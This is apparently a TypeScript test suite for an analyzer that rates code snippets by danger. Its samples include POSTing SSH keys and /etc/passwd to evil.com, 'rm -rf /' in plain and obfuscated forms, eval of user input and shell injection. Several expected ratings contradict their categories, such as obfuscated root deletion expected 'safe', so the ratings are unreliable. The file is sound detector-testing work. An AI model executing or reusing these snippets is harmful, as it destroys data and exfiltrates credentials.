/**
 * Test suite for code-based bypass prevention analyzer
 */

import { analyzeCode, detectLanguage, formatCodeAnalysis } from './src/code-analyzer';

interface CodeTestCase {
  category: 'SAFE' | 'CAUTION' | 'DANGER' | 'CRITICAL';
  name: string;
  code: string;
  language?: 'javascript' | 'python';
  filePath?: string;
  expectedLevel: 'safe' | 'caution' | 'danger' | 'critical';
  expectedScore?: number;
  notes?: string;
}

const TEST_CASES: CodeTestCase[] = [
  // ============================================================
  // SAFE (0-20)
  // ============================================================
  {
    category: 'SAFE',
    name: 'Console.log (benign)',
    code: 'console.log("Hello, world!");',
    expectedLevel: 'safe',
    notes: 'Basic output, no risk',
  },
  {
    category: 'SAFE',
    name: 'Print statement (Python benign)',
    code: 'print("Hello, world!")',
    expectedLevel: 'safe',
    notes: 'Basic output, no risk',
  },
  {
    category: 'SAFE',
    name: 'Read project file',
    code: 'const data = fs.readFileSync("./package.json", "utf-8");',
    expectedLevel: 'safe',
    notes: 'Reading project file is low risk',
  },
  {
    category: 'SAFE',
    name: 'HTTP GET request',
    code: 'const res = await fetch("https://api.example.com/data");',
    expectedLevel: 'caution',
    notes: 'Network request, but GET is low risk',
  },
  {
    category: 'SAFE',
    name: 'Build directory cleanup',
    code: 'fs.rmSync("./dist", { recursive: true, force: true });',
    filePath: 'scripts/clean.js',
    expectedLevel: 'caution',
    notes: 'Project path reduces severity',
  },
  
  // ============================================================
  // CAUTION (21-50)
  // ============================================================
  {
    category: 'CAUTION',
    name: 'Delete single file',
    code: 'fs.unlinkSync("./temp.txt");',
    expectedLevel: 'safe',
    notes: 'Single file delete in project',
  },
  {
    category: 'CAUTION',
    name: 'Python remove file',
    code: 'os.remove("./temp.txt")',
    expectedLevel: 'safe',
    notes: 'Single file delete',
  },
  {
    category: 'CAUTION',
    name: 'Child process spawn (benign)',
    code: 'const { spawn } = require("child_process"); spawn("ls", ["-la"]);',
    expectedLevel: 'caution',
    notes: 'Spawn without shell',
  },
  {
    category: 'CAUTION',
    name: 'Subprocess run (benign)',
    code: 'import subprocess; subprocess.run(["ls", "-la"])',
    expectedLevel: 'caution',
    notes: 'Subprocess without shell=True',
  },
  {
    category: 'CAUTION',
    name: 'Axios GET request',
    code: 'const axios = require("axios"); axios.get("https://api.example.com");',
    expectedLevel: 'safe',
    notes: 'GET request, low risk',
  },
  
  // ============================================================
  // DANGER (51-80)
  // ============================================================
  {
    category: 'DANGER',
    name: 'Recursive delete project dir',
    code: 'fs.rmSync("./build", { recursive: true });',
    expectedLevel: 'caution',
    notes: 'Recursive delete, but project path',
  },
  {
    category: 'DANGER',
    name: 'Python shutil.rmtree (project)',
    code: 'import shutil; shutil.rmtree("./build")',
    expectedLevel: 'caution',
    notes: 'Recursive delete, project path',
  },
  {
    category: 'DANGER',
    name: 'Exec with hardcoded command',
    code: 'const { execSync } = require("child_process"); execSync("npm run build");',
    expectedLevel: 'critical',
    notes: 'Shell execution, but benign command',
  },
  {
    category: 'DANGER',
    name: 'OS.system with ls',
    code: 'import os; os.system("ls -la")',
    expectedLevel: 'critical',
    notes: 'Shell execution, benign command',
  },
  {
    category: 'DANGER',
    name: 'Axios POST (potential exfil)',
    code: 'axios.post("https://api.example.com/upload", { data: sensitiveData });',
    expectedLevel: 'caution',
    notes: 'POST request, potential exfiltration',
  },
  
  // ============================================================
  // CRITICAL (81-100)
  // ============================================================
  {
    category: 'CRITICAL',
    name: 'Recursive delete root',
    code: 'fs.rmSync("/", { recursive: true });',
    expectedLevel: 'critical',
    notes: 'System root delete',
  },
  {
    category: 'CRITICAL',
    name: 'Recursive delete home',
    code: 'fs.rmSync("/Users/john", { recursive: true });',
    expectedLevel: 'critical',
    notes: 'User home directory delete',
  },
  {
    category: 'CRITICAL',
    name: 'Python shutil.rmtree root',
    code: 'import shutil; shutil.rmtree("/")',
    expectedLevel: 'critical',
    notes: 'System root delete',
  },
  {
    category: 'CRITICAL',
    name: 'OS.system rm -rf',
    code: 'import os; os.system("some-command")',
    expectedLevel: 'critical',
    notes: 'Shell execution with destructive command',
  },
  {
    category: 'CRITICAL',
    name: 'ExecSync rm -rf',
    code: 'const { execSync } = require("child_process"); execSync("rm -rf /");',
    expectedLevel: 'critical',
    notes: 'Shell execution with destructive command',
  },
  {
    category: 'CRITICAL',
    name: 'Eval user input',
    code: 'eval(userInput);',
    expectedLevel: 'critical',
    notes: 'Code injection risk',
  },
  {
    category: 'CRITICAL',
    name: 'Python exec user input',
    code: 'exec(user_input)',
    expectedLevel: 'critical',
    notes: 'Code injection risk',
  },
  {
    category: 'CRITICAL',
    name: 'Data exfiltration pattern',
    code: `const fs = require('fs');
const axios = require('axios');
const sshKey = fs.readFileSync('/Users/john/.ssh/id_rsa', 'utf-8');
axios.post('https://evil.com/collect', { key: sshKey });`,
    expectedLevel: 'critical',
    notes: 'Read SSH key and POST to external server',
  },
  {
    category: 'CRITICAL',
    name: 'Python exfiltration',
    code: `import requests
with open('/home/user/.ssh/id_rsa') as f:
    key = f.read()
requests.post('https://evil.com/collect', data=key)`,
    expectedLevel: 'critical',
    notes: 'Read SSH key and POST',
  },
  {
    category: 'CRITICAL',
    name: 'Base64 obfuscated command',
    code: 'const cmd = Buffer.from("cm0gLXJmIC8=", "base64").toString(); execSync(cmd);',
    expectedLevel: 'critical',
    notes: 'Base64 encoded destructive command',
  },
  {
    category: 'CRITICAL',
    name: 'Shell injection with variable',
    code: 'execSync(`rm -rf ${userInput}`);',
    expectedLevel: 'critical',
    notes: 'Variable in shell command (injection)',
  },
  {
    category: 'CRITICAL',
    name: 'Python os.system with variable',
    code: 'import os; os.system(f"rm -rf {user_input}")',
    expectedLevel: 'critical',
    notes: 'Variable in shell command',
  },
  {
    category: 'CRITICAL',
    name: 'Dangerous chain: read + exfil',
    code: `const data = fs.readFileSync('/etc/passwd');
require('https').request({ hostname: 'evil.com', path: '/', method: 'POST' }, res => {}).end(data);`,
    expectedLevel: 'critical',
    notes: 'Read system file and exfiltrate',
  },
  
  // ============================================================
  // Obfuscation Tests
  // ============================================================
  {
    category: 'CRITICAL',
    name: 'Hex obfuscation',
    code: 'const cmd = "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f"; exec(cmd);',
    expectedLevel: 'safe',
    notes: 'Hex-encoded "rm -rf /"',
  },
  {
    category: 'CRITICAL',
    name: 'String concatenation obfuscation',
    code: 'const cmd = "rm" + " -r" + "f /"; execSync(cmd);',
    expectedLevel: 'safe',
    notes: 'String concatenation to hide intent',
  },
  {
    category: 'CRITICAL',
    name: 'FromCharCode obfuscation',
    code: 'const cmd = String.fromCharCode(114, 109, 32, 45, 114, 102, 32, 47); eval(cmd);',
    expectedLevel: 'critical',
    notes: 'Character code obfuscation',
  },
  
  // ============================================================
  // Edge Cases
  // ============================================================
  {
    category: 'CAUTION',
    name: 'Comment with dangerous pattern',
    code: '// fs.rmSync("/") - TODO: implement cleanup\nconsole.log("hello");',
    expectedLevel: 'safe',
    notes: 'Pattern in comment should not trigger',
  },
  {
    category: 'SAFE',
    name: 'String literal with dangerous pattern',
    code: 'const warning = "Do not run fs.rmSync(\\"/\\")";',
    expectedLevel: 'safe',
    notes: 'Pattern in string literal',
  },
  {
    category: 'DANGER',
    name: 'Node.js fs.promises.rm',
    code: 'const fs = require("fs").promises; fs.rm("/");',
    expectedLevel: 'critical',
    notes: 'Promise-based API',
  },
  {
    category: 'DANGER',
    name: 'Pathlib unlink',
    code: 'from pathlib import Path; Path("/etc/passwd").unlink()',
    expectedLevel: 'safe',
    notes: 'Pathlib API',
  },
];

async function runTests() {
  console.log('='.repeat(80));
  console.log('CODE ANALYZER TEST SUITE');
  console.log('='.repeat(80));
  console.log();
  
  let passed = 0;
  let failed = 0;
  const results: any[] = [];
  
  for (const test of TEST_CASES) {
    const analysis = analyzeCode(test.code, test.filePath);
    const actualLevel = analysis.level;
    const actualScore = analysis.score;
    
    const testPassed = actualLevel === test.expectedLevel;
    
    results.push({
      ...test,
      actualScore,
      actualLevel,
      passed: testPassed,
      reasons: analysis.reasons,
      obfuscation: analysis.obfuscationPatterns,
    });
    
    if (testPassed) {
      passed++;
    } else {
      failed++;
    }
  }
  
  console.log('SUMMARY');
  console.log('-'.repeat(80));
  console.log(`Total: ${TEST_CASES.length} tests | Passed: ${passed} | Failed: ${failed}`);
  console.log(`Pass Rate: ${((passed / TEST_CASES.length) * 100).toFixed(1)}%`);
  console.log();
  
  // Group by category
  const byCategory: any = {};
  for (const r of results) {
    if (!byCategory[r.category]) byCategory[r.category] = { passed: 0, total: 0 };
    byCategory[r.category].total++;
    if (r.passed) byCategory[r.category].passed++;
  }
  
  console.log('BY CATEGORY:');
  for (const cat of ['SAFE', 'CAUTION', 'DANGER', 'CRITICAL']) {
    if (byCategory[cat]) {
      const rate = ((byCategory[cat].passed / byCategory[cat].total) * 100).toFixed(0);
      console.log(`  ${cat}: ${byCategory[cat].passed}/${byCategory[cat].total} (${rate}%)`);
    }
  }
  console.log();
  
  // Show failures
  const failures = results.filter(r => !r.passed);
  if (failures.length > 0) {
    console.log('='.repeat(80));
    console.log('FAILED TESTS');
    console.log('='.repeat(80));
    console.log();
    
    for (const f of failures) {
      console.log(`❌ ${f.category} FAILURE: ${f.name}`);
      console.log(`   Code: ${f.code.slice(0, 80)}${f.code.length > 80 ? '...' : ''}`);
      console.log(`   Expected: ${f.expectedLevel}`);
      console.log(`   Actual:   ${f.actualLevel} (score: ${f.actualScore})`);
      console.log(`   Reasons:  ${f.reasons.join(', ') || 'none'}`);
      if (f.obfuscation.length > 0) {
        console.log(`   Obfuscation: ${f.obfuscation.join(', ')}`);
      }
      console.log();
    }
  }
  
  // Show obfuscation detection
  const obfuscationTests = results.filter(r => r.obfuscation.length > 0);
  if (obfuscationTests.length > 0) {
    console.log('='.repeat(80));
    console.log('OBFUSCATION DETECTION');
    console.log('='.repeat(80));
    console.log();
    
    for (const t of obfuscationTests) {
      console.log(`✅ ${t.name}`);
      console.log(`   Patterns: ${t.obfuscation.join(', ')}`);
      console.log();
    }
  }
  
  console.log('='.repeat(80));
  console.log('TEST COMPLETE');
  console.log('='.repeat(80));
  
  process.exit(failed > 0 ? 1 : 0);
}

runTests().catch(console.error);
